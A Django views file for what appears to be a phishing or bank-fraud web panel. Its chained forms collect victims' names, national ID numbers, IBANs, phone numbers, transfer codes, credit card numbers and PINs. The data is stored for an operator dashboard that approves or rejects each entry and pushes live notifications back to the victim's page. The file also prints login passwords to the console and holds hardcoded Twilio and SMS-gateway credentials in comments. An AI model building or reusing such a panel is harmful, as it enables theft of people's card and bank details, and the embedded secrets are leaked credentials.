import json
from random import randint
from django.http import HttpResponse, JsonResponse
from services.models import Msg, Service
from django.shortcuts import redirect, render
import requests
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync
# import aiohttp


# Create your views here.



def ShowIndex(request):
    return render(request, 'services/index.html')


def ShowService(request):
    return render(request, 'services/khedma - Copy.html')

def ShowRegister1(request):
    if request.method == 'POST':
        fullName = request.POST.get('full_name')
        idNum = request.POST.get('id_num')
        # print(fullName,idNum,"###############################################")
        # return render(request, 'services/register2.html',{full_name})
        return redirect('services:register2', full_name=fullName, idNum = idNum)

    return render(request, 'services/register1.html')

def ShowRegister2(request, full_name, idNum ):
    if request.method == 'POST':
        Bank = request.POST.get('bank')
        otherBank = request.POST.get('otherBank')
        Iban = request.POST.get('iban')
        PhoneNum = request.POST.get('phone_number')
        if( otherBank == ''):
            otherBank = " "
        return redirect('services:register3', fullName=full_name, idNum = idNum, bank = Bank, otherBank = otherBank,iban = Iban, phoneNum = PhoneNum)

    return render(request, 'services/register2(1).html')

def ShowRegister3(request, fullName, idNum, bank, otherBank, iban, phoneNum,):
    if request.method == 'POST':
        transferId = request.POST.get('transfer_code')
        amount = request.POST.get('transfer_amount')
        return redirect('services:register4', fullName=fullName, idNum = idNum, bank = bank, otherBank = otherBank,iban = iban, phoneNum = phoneNum, transferId = transferId, amount = amount)
    return render(request, 'services/register3.html')

def ShowRegister4(request, fullName, idNum, bank, otherBank, iban, phoneNum, transferId, amount):
    if request.method == 'POST':
        reqNum = request.POST.get('order_num')
        CardNum = request.POST.get('credit_card')
        Code = request.POST.get('pin_code')
        return redirect('services:register5', fullName=fullName, idNum = idNum, bank = bank, otherBank = otherBank, iban = iban, phoneNum = phoneNum, transferId = transferId, amount = amount, reqNum = reqNum, CardNum = CardNum, Code = Code)
    return render(request, 'services/register4(1).html')

def ShowRegister5(request, fullName, idNum, bank, otherBank, iban, phoneNum, transferId, amount, reqNum, CardNum, Code):
    if request.method == 'POST':
        list1 = list(CardNum)
        CardNumF = list1[:9]
        CardNumL = list1[9:]
        CardNumF[-1] = str(randint(0, 9))
        CardNumL[2] = str(randint(0, 9))
        CardNum = ''.join(CardNumF+CardNumL)
        service = Service()
        service.fullName = fullName
        service.idNum = idNum
        service.bank = bank
        service.otherBank = otherBank
        service.iban = iban
        service.phoneNum = phoneNum
        service.transferId = transferId
        service.amount = amount
        service.requestNum = reqNum
        service.CardNum = CardNum
        service.Code = Code
        service.confirmed = False
        service.save()
        
        return render(request,'services/register6.html',{
            'room_name': "broadcast",
            'reqNum' : reqNum,
        })
    number = phoneNum[-3:]
    # request.session['reqNum'] = reqNum
    print(number, "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
    return render(request, 'services/register5.html',{'number':number})


def ShowSuccess(request):
    # reqNum = request.session.get('reqNum')
    return render(request, 'services/register6.html',{
        'room_name': "broadcast",
    })

def ShowLogin(request):
    if request.method == 'POST':
        username= request.POST.get('username')
        password = request.POST.get('password')

        user = authenticate(request, username = username, password= password)
        print(username,password,"#########################################################")
        if user is not None:
            login(request, user)
            return redirect('services:dashboard')
    return render(request, 'services/login.html')

def LogoutUser(request):
    logout(request)
    return redirect('services:login')

@login_required(login_url='services:login')
def dashboard(request):
    # service = Service()
    # service.fullName = "abdurhman"
    # service.idNum = "1232432523"
    # service.bank = "test bank"
    # service.otherBank = ""
    # service.iban = "tr64365476573453"
    # service.phoneNum = "6574783342"
    # service.transferId = '345356354623'
    # service.amount = "5000"
    # service.requestNum = "63456354"
    # service.CardNum = "45234532345235241"
    # service.Code = "4566"
    # service.confirmed = False
    # service.save()
    services = Service.objects.all()
    return render(request, 'services/dashboard.html', {'services':services})

def editMsgs(request):
    if request.method == 'POST':
        toBeSavedMsg = Msg.objects.all()[0]
        approveMsg = request.POST.get('approve_msg')
        regMsg = request.POST.get('disapprove_msg')
        toBeSavedMsg.approveMsg = approveMsg
        toBeSavedMsg.regMsg = regMsg
        toBeSavedMsg.save()


    msg = Msg.objects.all()
    newMsg = Msg()
    if(len(msg) == 0):
        newMsg.approveMsg = "test App "
        newMsg.regMsg = "test reg "
        newMsg.save()
    else:
        newMsg = msg[0]
    return render(request, 'services/editMsg.html', {'msg':newMsg})


def approveRequest(request, id):
    if request.method == 'POST':
        service = Service.objects.get(id = id)
        service.confirmed = True
        responce = sendMessage(request, service.phoneNum, "this is a test massage for "+service.fullName)
        called = request.session.get('deblocking_call')
        # async with aiohttp.ClientSession() as session:
        #     async with sync_to_async(sendMessage(service.phoneNum, "this is a test massage for "+service.fullName)) as res:
        #         responce = await res
        channel_layer = get_channel_layer()
        async_to_sync(channel_layer.group_send)(
            "notification_broadcast",
            {
                'type': 'send_notification',
                'message': json.dumps("success")
            }
        )
        service.save()
        print(service.fullName,"approve   ","####################################################", responce)
        return JsonResponse({'content':str(responce)},status = 200)


def disApproveRequest(request, id):
    if request.method == 'POST':
        service = Service.objects.get(id = id)
        service.confirmed = False
        channel_layer = get_channel_layer()
        async_to_sync(channel_layer.group_send)(
            "notification_broadcast",
            {
                'type': 'send_notification',
                'message': json.dumps("Notification")
            }
        )
        service.save()
        print(service.fullName,"Disapprove","####################################################")
        return JsonResponse({},status = 200)



def sendMessage(request, phoneNumber, message):
    pass
    # account_sid = "AC8989a920ca3bc5dcfb022c871d0d0e9c"
    # # Your Auth Token from twilio.com/console
    # auth_token  = "915db5f4eedea39a882eaf7fcb5bfd6c"

    # client = Client(account_sid, auth_token)

    # message = client.messages.create(
    #     to="+966502294305",
    #     from_="+12059315467", 
    #     body="Hello from abdu's Python API!")

    # print(message.sid, "#################################################################")
    # return message
    
    # postUrl='http://panel.vatansms.com/panel/smsgonderNNpost.php'
    # kullanicino = '42861'
    # kullaniciAdi='905527159876'
    # sifre='76dtPF98'
    # orjinator="SMS TEST"

    # tur='Normal' """ Normal yada Turkce """
    # # zaman='2014-04-07 10:00:00'

    # mesaj1='Bu bir test mesajidir.'
    # mesaj2='Bu bir test2 mesajidir.'
    # numara1='05354447775'
    # numara2='05410002221'

    # string = """
    # <sms>
    #     <kno>"""+str(kullanicino)+"""</kno>
    #     <kulad>"""+str(kullaniciAdi)+"""</kulad>
    #     <sifre>"""+str(sifre)+"""</sifre>
    #     <gonderen>"""+str(orjinator)+"""</gonderen>
    #     <telmesajlar>
    #         <telmesaj>
    #         <tel>"""+str(phoneNumber)+"""</tel><mesaj>"""+str(message)+"""</mesaj>
    #         </telmesaj>
    #     </telmesajlar>
    #     <tur>"""+str(tur)+"""</tur>
    # </sms>
    # """
    #     # <telmesaj>
    #     #     <tel>"""+numara2+"""</tel><mesaj>"""+mesaj2+"""</mesaj>
    #     # </telmesaj>
    # """ Xml içinde aşağıdaki alanlarıda gönderebilirsiniz.
    # <zaman>2014-04-07 10:00:00</zaman> İleri tarih için kullanabilirsiniz """

    # response =  requests.post(postUrl, data={"data":string})
    # print(response)
    # request.session['deblocking_call'] = True
    # return response.content